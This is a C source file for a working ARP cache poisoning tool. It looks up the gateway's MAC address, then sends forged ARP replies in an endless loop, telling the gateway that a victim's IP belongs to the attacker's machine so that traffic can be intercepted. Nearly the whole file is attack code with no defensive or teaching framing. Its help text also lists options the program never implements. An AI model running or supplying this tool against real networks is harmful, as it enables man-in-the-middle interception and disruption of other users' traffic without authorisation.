#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <errno.h>
#include <ifaddrs.h>
#include <getopt.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>

void die(const char *error)
{
	fprintf(stderr, "Error: %s\n", error);
	exit(EXIT_FAILURE);
}

void print_addrs(const char *msg, uint32_t ip, unsigned char *mac)
{
	printf("%9s:\t%s\t%02x:%02x:%02x:%02x:%02x:%02x\n",
		msg,
		inet_ntoa((struct in_addr) { .s_addr = ip }),
		(unsigned char) mac[0],
		(unsigned char) mac[1],
		(unsigned char) mac[2],
		(unsigned char) mac[3],
		(unsigned char) mac[4],
		(unsigned char) mac[5]);
}

void set_ifr_name(struct ifreq *ifr, const char *if_name)
{
	size_t if_name_len = strlen(if_name);
	if (if_name_len < sizeof(ifr->ifr_name)) {
		memcpy(ifr->ifr_name, if_name, if_name_len);
		ifr->ifr_name[if_name_len] = 0;
	} else {
		die("Interface name is too long");
	}
}

int get_ifr_ifindex(int fd, struct ifreq *ifr)
{
	if (ioctl(fd, SIOCGIFINDEX, ifr) == -1) {
		die(strerror(errno));
	}

	return ifr->ifr_ifindex;
}

void get_ifr_hwaddr(int fd, struct ifreq *ifr)
{
	if (ioctl(fd, SIOCGIFHWADDR, ifr) == -1) {
		die(strerror(errno));
	}
	if (ifr->ifr_hwaddr.sa_family != ARPHRD_ETHER) {
		die("Not an ethernet interface");
	}
}

void get_ifr_addr(int fd, struct ifreq *ifr)
{
	if (ioctl(fd, SIOCGIFADDR, ifr) == -1) {
		die(strerror(errno));
	}
}

bool check_interface(const char *if_name)
{
	struct ifaddrs *ifaddr, *ifa;
	if (getifaddrs(&ifaddr) == -1) {
		die(strerror(errno));
	}

	ifa = ifaddr;
	while (ifa && strcmp(if_name, ifa->ifa_name)) {
		ifa = ifa->ifa_next;
	}

	unsigned int flags = ifa ? ifa->ifa_flags : 0;
	bool ret = ifa && (flags & IFF_UP) && (flags & IFF_RUNNING) && !(flags & IFF_LOOPBACK);
	freeifaddrs(ifaddr);
	return ret;
}

char *get_interface(void)
{
	struct ifaddrs *ifaddr, *ifa;
	char *ret = NULL;
	if (getifaddrs(&ifaddr) == -1) {
		die(strerror(errno));
	}

	/* get first listed operational interface */
	for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
		unsigned int flags = ifa->ifa_flags;
		if ((flags & IFF_UP) && (flags & IFF_RUNNING) && !(flags & IFF_LOOPBACK)) {
			ret = strdup(ifa->ifa_name);
			break;
		}
	}

	freeifaddrs(ifaddr);
	return ret;
}

uint32_t get_gateway(const char *if_name)
{
	uint32_t ret;
	char buf[1024];
	const char seps[] = " \t";
	FILE *f = fopen("/proc/net/route", "r");

	/* believe it or not, this is the best way to do it */
	do {
		fgets(buf, 1024, f);
	} while (strncmp(if_name, buf, strlen(if_name)));

	char *p = strtok(buf, seps);
	p = strtok(NULL, seps);
	p = strtok(NULL, seps);
	p[8] = '\0';

	ret = strtol(p, NULL, 16);

	fclose(f);
	return ret;
}

void request_mac(int fd, const char *if_name, struct ether_arp *req, uint32_t ip_addr)
{
	/* will be sent to everyone */
	const unsigned char ether_broadcast_addr[] =
	{ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };

	struct ifreq ifr;
	set_ifr_name(&ifr, if_name);

	/* special socket address type used for AF_PACKET */
	struct sockaddr_ll addr = {0};
	addr.sll_family   = AF_PACKET;
	addr.sll_ifindex  = get_ifr_ifindex(fd, &ifr);
	addr.sll_halen    = ETHER_ADDR_LEN;
	addr.sll_protocol = htons(ETH_P_ARP);
	memcpy(addr.sll_addr, ether_broadcast_addr, ETHER_ADDR_LEN);

	/* construct the ARP request */
	req->arp_hrd = htons(ARPHRD_ETHER);
	req->arp_pro = htons(ETH_P_IP);
	req->arp_hln = ETHER_ADDR_LEN;
	req->arp_pln = sizeof(in_addr_t);
	req->arp_op  = htons(ARPOP_REQUEST);

	/* zero because that's what we're asking for */
	memset(&req->arp_tha, 0, sizeof(req->arp_tha));
	memcpy(&req->arp_tpa, &ip_addr, sizeof(req->arp_tpa));
	get_ifr_hwaddr(fd, &ifr);
	memcpy(&req->arp_sha, (unsigned char *) ifr.ifr_hwaddr.sa_data, sizeof(req->arp_sha));
	get_ifr_addr(fd, &ifr);
	memcpy(&req->arp_spa, (unsigned char *) ifr.ifr_addr.sa_data + 2, sizeof(req->arp_spa));

	/* actually send it */
	if (sendto(fd, req, sizeof(struct ether_arp), 0, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
		die(strerror(errno));
	}

	while (1) {
		/* can't use recvfrom() -- no network layer */
		int len = recv(fd, req, sizeof(struct ether_arp), 0);
		if (len == -1) {
			die(strerror(errno));
		}
		if (len == 0) {   /* no response */
			continue;
		}
		
		unsigned int from_addr =
			(req->arp_spa[3] << 24)
		      | (req->arp_spa[2] << 16)
		      | (req->arp_spa[1] << 8)
		      | (req->arp_spa[0] << 0);
		if (from_addr != ip_addr) {
			continue;
		}

		/* everything's good, we have our response */
		break;
	}
}

void arp_spoof(int fd, const char *if_name,
		const unsigned char *attacker_mac, uint32_t gateway_ip,
		const unsigned char *victim_mac, uint32_t victim_ip)
{
	struct ether_arp resp;
	struct ifreq ifr;
	set_ifr_name(&ifr, if_name);

	struct sockaddr_ll addr = {0};
	addr.sll_family         = AF_PACKET;
	addr.sll_ifindex        = get_ifr_ifindex(fd, &ifr);
	addr.sll_halen          = ETHER_ADDR_LEN;
	addr.sll_protocol       = htons(ETH_P_ARP);
	memcpy(addr.sll_addr, victim_mac, ETHER_ADDR_LEN);

	resp.arp_hrd = htons(ARPHRD_ETHER);
	resp.arp_pro = htons(ETH_P_IP);
	resp.arp_hln = ETHER_ADDR_LEN;
	resp.arp_pln = sizeof(in_addr_t);
	resp.arp_op  = htons(ARPOP_REPLY);

	memcpy(&resp.arp_sha, attacker_mac, sizeof(resp.arp_sha));
	memcpy(&resp.arp_spa, &gateway_ip,  sizeof(resp.arp_spa));
	memcpy(&resp.arp_tha, victim_mac,   sizeof(resp.arp_tha));
	memcpy(&resp.arp_tpa, &victim_ip,   sizeof(resp.arp_tpa));

	if (sendto(fd, &resp, sizeof(resp), 0, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
		die(strerror(errno));
	}
}

void print_help(char argv0[]) {
	printf("Usage: %s [OPTION [ARG]]... VICTIM_IP\n", argv0);
	puts("  -i, --interface Network interface to use, given as the argument. If this option is not used, the interface defaults to the first running non-loopback interface.");
	puts("  -r, --repeat Resends the packet continuously with a delay given in seconds by the argument. A delay of zero means only one packet is sent.");
	puts("  -a, --attacker-ip Choose another machine (other than the one running this program) as the one to be disguised.");
	puts("  -g, --gateway-ip Spoof to an IP (given as an argument) other than the default gateway.");
	puts("  -v, --verbose Prints out extra info about the machines involved.");
}

int main(int argc, char *argv[]) {

    if(argc != 4) {
        printf("USAGE : arp_spoofing.exe <interface> <gateway ip> <victim ip>\n");
        exit(EXIT_FAILURE);
    }

	struct ether_arp req;
	unsigned char attacker_mac[6];
	unsigned char victim_mac[6];
    unsigned char gateway_mac[6];
	struct in_addr ip_addr = {0};

	uint32_t attacker_ip   = 0;

    char *if_name          = strdup(argv[1]);
	char *gateway_ip_str    = strdup(argv[2]);
    char *victim_ip_str    = strdup(argv[3]);
    

    if (!inet_aton(gateway_ip_str, &ip_addr))
		die("Invalid IP address");
	
	uint32_t gateway_ip = ip_addr.s_addr;
		
	if (!inet_aton(victim_ip_str, &ip_addr))
		die("Invalid IP address");

	uint32_t victim_ip = ip_addr.s_addr;

	/* get_interface() didn't find anything */

	/* get an ARP socket */
	int fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if (fd == -1) {
		die(strerror(errno));
	}

	struct ifreq ifr;
	set_ifr_name(&ifr, if_name);
	get_ifr_hwaddr(fd, &ifr);
	memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, sizeof(attacker_mac));
	get_ifr_addr(fd, &ifr);
	memcpy(&attacker_ip, (unsigned char *) ifr.ifr_addr.sa_data + 2, sizeof(attacker_ip));

	request_mac(fd, if_name, &req, gateway_ip);
	memcpy(gateway_mac, req.arp_sha, sizeof(victim_mac));

	while(1) {
		arp_spoof(fd, if_name, attacker_mac, victim_ip, gateway_mac, gateway_ip);
	}

	free(if_name);
	return EXIT_SUCCESS;
}